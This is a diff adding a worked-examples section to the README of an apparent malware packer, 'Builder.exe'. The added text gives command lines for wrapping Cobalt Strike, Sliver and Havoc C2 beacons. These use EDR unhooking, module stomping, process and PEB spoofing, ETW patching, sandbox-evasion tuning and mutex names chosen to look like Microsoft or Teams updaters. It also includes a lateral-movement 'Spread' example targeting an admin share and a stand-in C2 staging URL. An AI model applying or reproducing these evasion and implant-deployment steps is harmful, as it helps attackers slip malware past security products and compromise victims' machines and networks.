@@ -22,7 +22,7 @@ Ensure `stub.bin` is in the same directory as `Builder.exe`.
 Builder.exe <input> <output> [OPTIONS]
 
   <input>   Target PE (.exe/.dll) or raw shellcode (.bin)
-            Payload type is auto-detected from the MZ header — no flag needed.
+            Payload type is auto-detected from the MZ header - no flag needed.
   <output>  Output executable
 
 Loader:
@@ -81,6 +81,197 @@ Examples:
   Builder.exe implant.exe     packed.exe --overload --hammer-s 5 --uptime-min 5
   Builder.exe implant.exe     packed.exe --exec-ctrl-name MyMutex --sleep-fwd-ms 1000
 ```
+
+---
+
+## Examples
+
+Worked examples grouped by scenario. Every flag is opt-out (evasion is fully ON by default), so the simplest invocation already gets the full stack.
+
+<details>
+<summary><b>Basic packing - EXE / DLL / shellcode</b></summary>
+
+Pack an unmanaged EXE. Builder auto-detects the `MZ` header and routes through the RunPE path:
+```
+Builder.exe implant.exe packed.exe
+```
+
+Pack raw position-independent shellcode (Cobalt Strike `.bin`, msfvenom `-f raw`, etc.). No `MZ` → direct call into the decompressed buffer:
+```
+Builder.exe beacon.bin packed.exe
+```
+
+Pack a DLL and call its default `DllMain` only (no export):
+```
+Builder.exe payload.dll packed.exe
+```
+
+Use a stub from a non-default location:
+```
+Builder.exe implant.exe packed.exe --stub C:\build\release\stub.bin
+```
+
+</details>
+
+<details>
+<summary><b>DLL payloads with exports - Havoc / Sliver / custom beacons</b></summary>
+
+Call a named export after `DllMain` returns. Most C2 implants ship as a DLL with a single entry export (e.g. Havoc Demon: `Start`, Sliver: `RunSliver`):
+```
+Builder.exe demon.dll packed.exe --export Start --keep-alive
+```
+
+Pass a string argument to the export (max 127 chars). Useful for payloads that take a config string, URL, or shell command:
+```
+Builder.exe runner.dll packed.exe --export Execute --arg "https://c2.example.com/stage"
+Builder.exe loader.dll packed.exe --export Run --arg "C:\\Windows\\System32\\calc.exe"
+```
+
+`--keep-alive` is required for any payload that spawns its own threads - without it the loader calls `ExitProcess` and kills the beacon.
+
+</details>
+
+<details>
+<summary><b>Long-running implants (C2 beacons)</b></summary>
+
+Cobalt Strike / Sliver / Havoc all spawn a beacon thread and return. The loader thread must terminate without taking the process down:
+```
+Builder.exe beacon.exe   packed.exe --keep-alive
+Builder.exe beacon.bin   packed.exe --keep-alive
+Builder.exe demon.dll    packed.exe --export Start --keep-alive
+```
+
+</details>
+
+<details>
+<summary><b>Module stomping presets - picking a host DLL</b></summary>
+
+The decryptor stub is hidden inside the `.text` section of a benign Windows DLL. Pick the preset whose loaded modules look most legitimate for the target context:
+```
+Builder.exe implant.exe packed.exe --preset PRINT
+Builder.exe implant.exe packed.exe --preset MEDIA
+Builder.exe implant.exe packed.exe --preset NETWORK
+Builder.exe implant.exe packed.exe --preset RANDOM
+```
+
+`PRINT` (default) - `xpsservices.dll`, `msi.dll`, `dbghelp.dll`. Common across most workstations.
+`NETWORK` - `winhttp.dll`, `wtsapi32.dll`, `wlanapi.dll`. Fits a payload that already needs network APIs loaded.
+`RANDOM` - three random indices from the full pool (including `bcrypt.dll`, idx 9).
+
+Switch from `LoadLibraryW` stomping to `NtCreateSection`+`NtMapViewOfSection` overloading (DLL never enters `PEB.Ldr`):
+```
+Builder.exe implant.exe packed.exe --overload
+Builder.exe implant.exe packed.exe --overload --preset NETWORK
+```
+
+</details>
+
+<details>
+<summary><b>EDR userland unhooking</b></summary>
+
+Restore clean `.text` bytes for `ntdll`, `kernel32`, `kernelbase` from `\KnownDlls\` over any EDR inline hooks. HellsHall already bypasses sensitive `Nt*` hooks; `--unhook` is needed only when the payload itself calls hooked Win32 APIs (e.g. `LoadLibrary`, `CreateProcess`):
+```
+Builder.exe implant.exe packed.exe --unhook
+Builder.exe implant.exe packed.exe --unhook --preset NETWORK --keep-alive
+```
+
+</details>
+
+<details>
+<summary><b>PEB spoofing - masquerading the process</b></summary>
+
+Override the auto-picked spoof name. Pick something that fits the parent process / launch context (Office macro → `RuntimeBroker.exe` looks weird, `WmiPrvSE.exe` blends in better):
+```
+Builder.exe implant.exe packed.exe --spoof-name SgrmBroker.exe
+Builder.exe implant.exe packed.exe --spoof-name svchost.exe
+```
+
+The spoof name is just an ASCII filename - Stub prepends `C:\Windows\System32\` at runtime. Anything not in the default 9-process pool works too.
+
+</details>
+
+<details>
+<summary><b>Tuning evasion thresholds</b></summary>
+
+Longer hammer delay against patient sandboxes that run for tens of seconds before judging:
+```
+Builder.exe implant.exe packed.exe --hammer-s 10
+```
+
+Higher uptime threshold - only run if the box has been up for at least 30 minutes (most sandboxes spin a fresh VM per sample):
+```
+Builder.exe implant.exe packed.exe --uptime-min 30
+```
+
+Tighter sleep-forwarding detection (shorter sleep, harder to fast-forward without observable error):
+```
+Builder.exe implant.exe packed.exe --sleep-fwd-ms 200
+```
+
+Custom semaphore name for the exec-control check (avoids clashing with another sample using the default `wuauctl`):
+```
+Builder.exe implant.exe packed.exe --exec-ctrl-name OneDriveSync
+```
+
+Stack everything for a paranoid profile:
+```
+Builder.exe implant.exe packed.exe --hammer-s 8 --uptime-min 15 --sleep-fwd-ms 250 --exec-ctrl-name TeamsUpdate
+```
+
+</details>
+
+<details>
+<summary><b>Disabling features for debugging / lab work</b></summary>
+
+When iterating in a debugger, the TLS callback and debugger checks fire immediately. Disable both to attach freely:
+```
+Builder.exe implant.exe packed.exe --disable tls,debugger
+```
+
+Skip every sandbox check (still keeps OPSEC features on - ETW patch, PEB spoof, call-stack spoof):
+```
+Builder.exe implant.exe packed.exe --disable hammer,debugger,api-emu,exec-ctrl,sleep-fwd,uptime,cpu,screen,files
+```
+
+Same thing, shorter:
+```
+Builder.exe implant.exe packed.exe --disable all
+```
+
+Disable specific OPSEC features (e.g. when the target environment doesn't need ETW patching, or PEB spoof breaks a payload that walks its own PEB):
+```
+Builder.exe implant.exe packed.exe --disable etw
+Builder.exe implant.exe packed.exe --disable peb,spoofing
+```
+
+`--disable all` only covers sandbox/debug checks. OPSEC tokens (`etw`, `spoofing`, `peb`, `tls`) must be listed explicitly.
+
+</details>
+
+<details>
+<summary><b>Realistic combinations</b></summary>
+
+Cobalt Strike beacon DLL, network-themed host, full evasion, custom mutex name:
+```
+Builder.exe beacon.dll packed.exe --export Start --keep-alive --preset NETWORK --exec-ctrl-name MicrosoftEdgeUpdate
+```
+
+Havoc Demon shellcode, overloading instead of stomping, longer hammer delay:
+```
+Builder.exe demon.bin packed.exe --keep-alive --overload --hammer-s 6
+```
+
+Stage-2 EXE for a CTF where you control the trigger and don't need anti-debug:
+```
+Builder.exe stage2.exe packed.exe --disable all --disable tls,debugger
+```
+
+Lateral-movement helper DLL with a path argument:
+```
+Builder.exe lateral.dll packed.exe --export Spread --arg "\\\\TARGET\\C$\\Users\\Public\\" --keep-alive --unhook
+```
+
+</details>
 
 ---
 
